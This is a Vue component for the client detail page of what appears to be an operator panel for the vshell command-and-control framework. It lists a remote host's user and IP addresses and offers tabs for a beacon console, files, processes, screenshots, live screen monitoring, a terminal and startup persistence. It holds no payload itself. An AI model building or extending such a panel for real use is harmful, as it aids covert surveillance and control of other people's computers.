<template>
  <div class="cd-page">
    <!-- 客户端信息条（vshell：页头一行元信息） -->
    <div class="cd-head">
      <div class="cd-title">
        <VsIcon name="desktop" :size="18" />
        <span class="cd-host">{{ client?.Computer || uid.slice(0, 8) }}</span>
        <span v-if="client?.Username" class="cd-user">{{ client.Username }}</span>
        <span class="cd-tag" :class="isOnline ? 'is-online' : 'is-offline'">
          {{ isOnline ? (i18nStore.tl('在线', 'ON')) : (i18nStore.tl('离线', 'OFF')) }}
        </span>
      </div>
      <div class="cd-meta">
        <span v-if="client?.ExternalIP">{{ i18nStore.tl('外网', 'Ext') }} {{ client.ExternalIP }}</span>
        <span v-if="client?.InternalIP">{{ i18nStore.tl('内网', 'Int') }} {{ client.InternalIP }}</span>
        <span v-if="client?.Process">{{ client.Process }}</span>
        <span v-if="client?.Arch">{{ client.Arch }}</span>
      </div>
    </div>

    <!-- 功能页签（下划线式，vshell clientManager 同构） -->
    <div class="cd-tabs">
      <div
        v-for="t in TABS"
        :key="t.key"
        class="cd-tab"
        :class="{ active: t.key === func }"
        @click="switchTo(t.key)"
      >
        {{ i18nStore.tl(t.zh, t.en) }}
      </div>
    </div>

    <!-- 功能内容：重资产（屏幕监控/终端）切走即卸载断流；其余 KeepAlive 保状态。
         KeepAlive 常驻（只让子节点条件渲染），否则进重资产页签时缓存会被一并销毁 -->
    <div class="cd-body">
      <KeepAlive>
        <component v-if="comp && !isHeavy" :is="comp" :key="func" :uid="uid" />
      </KeepAlive>
      <component v-if="comp && isHeavy" :is="comp" :key="func" :uid="uid" />
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed, markRaw, onMounted, provide, shallowReactive, watch, type Component } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import VsIcon from '@/layout-vshell/VsIcon.vue'
import { CLIENT_FUNCS, type ClientFunc } from '@/router/routes'
import { useClientsStore } from '@/stores/clients'
import { useI18nStore } from '@/stores/i18n'
import { useTabsStore } from '@/stores/tabs'

defineOptions({ name: 'ClientDetail' })

const route = useRoute()
const router = useRouter()
const clients = useClientsStore()
const i18nStore = useI18nStore()
const tabs = useTabsStore()
const isZh = computed(() => i18nStore.isZh)

const uid = computed(() => String(route.params.uid || ''))
const func = computed<ClientFunc>(() => {
  const f = String(route.params.func || 'console') as ClientFunc
  return (CLIENT_FUNCS as readonly string[]).includes(f) ? f : 'console'
})

// 重资产页签：切走即卸载（断 WS / 停轮询），避免多路流并发
const HEAVY: ClientFunc[] = ['monitor', 'terminal']
const isHeavy = computed(() => HEAVY.includes(func.value))

const TABS: { key: ClientFunc; zh: string; en: string }[] = [
  { key: 'console', zh: '命令控制', en: 'Console' },
  { key: 'files', zh: '文件管理', en: 'Files' },
  { key: 'process', zh: '进程', en: 'Processes' },
  { key: 'screenshot', zh: '屏幕截屏', en: 'Screenshot' },
  { key: 'monitor', zh: '屏幕监控', en: 'Monitor' },
  { key: 'terminal', zh: '终端', en: 'Terminal' },
  { key: 'toolbox', zh: '工具箱', en: 'Toolbox' },
  { key: 'startup', zh: '开机启动', en: 'Startup' },
  { key: 'downloads', zh: '下载', en: 'Downloads' },
]

// 先解析再渲染：Vue 3.3 的 KeepAlive 不能直接缓存 defineAsyncComponent 包装器
// （异步解析后 parentComponent.ctx 缺 deactivate，切换时报错），故手动 import 后 markRaw
const LOADERS: Record<ClientFunc, () => Promise<{ default: Component }>> = {
  console: () => import('@/layout/BeaconConsole.vue'),
  files: () => import('@/views/client/View/ClientFiles.vue'),
  process: () => import('@/views/client/View/ClientPid.vue'),
  screenshot: () => import('@/views/client/View/ClientScreenshot.vue'),
  monitor: () => import('@/views/client/View/ClientMonitor.vue'),
  terminal: () => import('@/views/client/View/LinuxInteractiveTerminal.vue'),
  toolbox: () => import('@/views/client/View/ClientTools.vue'),
  startup: () => import('@/views/client/View/ClientStartup.vue'),
  downloads: () => import('@/views/client/View/ClientDownloads.vue'),
}
// 已解析组件按 func 缓存；未解析完成前不渲染（否则 KeepAlive 会用「新 key + 旧类型」
// 缓存出错误条目，切换时触发 Vue 内部 unmount 的 deactivate 报错）
const resolved = shallowReactive<Record<string, Component>>({})
const comp = computed<Component | null>(() => resolved[func.value] ?? null)
watch(func, async (f) => {
  if (resolved[f]) return
  const mod = await LOADERS[f]()
  resolved[f] = markRaw(mod.default)
}, { immediate: true })

// 兼容既有面板的 inject('realUid') 契约（它们同时支持 route.params.uid）
provide('realUid', uid)

const client = computed(() => clients.clientsList.find((c) => c.Uid === uid.value) || null)
const isOnline = computed(() => client.value?.Online === '1' || client.value?.Online === 'true')

function switchTo(f: ClientFunc) {
  router.replace(`/client/${uid.value}/${f}`)
}

// 标签标题细化：客户端主机名
watch(
  () => [route.fullPath, client.value?.Computer] as const,
  () => {
    if (client.value) {
      tabs.setTitle(route.fullPath, `${isZh.value ? '客户端' : 'Client'}: ${client.value.Computer || uid.value.slice(0, 8)}`)
    }
  },
  { immediate: true },
)

onMounted(() => {
  // 深链兜底：直接刷新本页时 store 为空，补一次拉取
  if (!clients.clientsList.length) clients.fetchClients()
  // URL 规范化：/client/<uid> → /client/<uid>/console
  if (!route.params.func) router.replace(`/client/${uid.value}/console`)
})
</script>

<style scoped>
.cd-page {
  height: 100%;
  display: flex;
  flex-direction: column;
  background: var(--cs-bg);
  overflow: hidden;
}

.cd-head {
  height: 48px;
  flex-shrink: 0;
  display: flex;
  align-items: center;
  gap: 16px;
  padding: 0 16px;
  background: var(--cs-panel);
  border-bottom: 1px solid var(--cs-card-border);
}

.cd-title {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 14px;
  color: var(--cs-text-bright);
}

.cd-host {
  font-weight: 600;
}

.cd-user {
  color: var(--cs-text-dim);
}

.cd-tag {
  display: inline-flex;
  align-items: center;
  height: 20px;
  padding: 0 7px;
  border-radius: 4px;
  font-size: 12px;
}

.cd-tag.is-online {
  background: var(--cs-online);
  color: #fff;
}

.cd-tag.is-offline {
  background: color-mix(in srgb, var(--cs-offline) 22%, transparent);
  color: var(--cs-text-dim);
}

.cd-meta {
  margin-left: auto;
  display: flex;
  align-items: center;
  gap: 12px;
  font-size: 12px;
  color: var(--cs-text-dim);
  font-family: var(--cs-font-mono);
}

.cd-tabs {
  height: 40px;
  flex-shrink: 0;
  display: flex;
  align-items: center;
  gap: 4px;
  padding: 0 16px;
  background: var(--cs-panel);
  border-bottom: 1px solid var(--cs-card-border);
  overflow-x: auto;
}

.cd-tab {
  height: 40px;
  display: inline-flex;
  align-items: center;
  padding: 0 12px;
  font-size: 14px;
  color: var(--cs-text);
  cursor: pointer;
  white-space: nowrap;
  border-bottom: 2px solid transparent;
  margin-bottom: -1px;
  transition: color 0.15s;
}

.cd-tab:hover {
  color: var(--cs-active);
}

.cd-tab.active {
  color: var(--cs-active);
  border-bottom-color: var(--cs-active);
}

.cd-body {
  flex: 1;
  min-height: 0;
  overflow: hidden;
  display: flex;
  flex-direction: column;
}

.cd-body > * {
  flex: 1;
  min-height: 0;
}
</style>
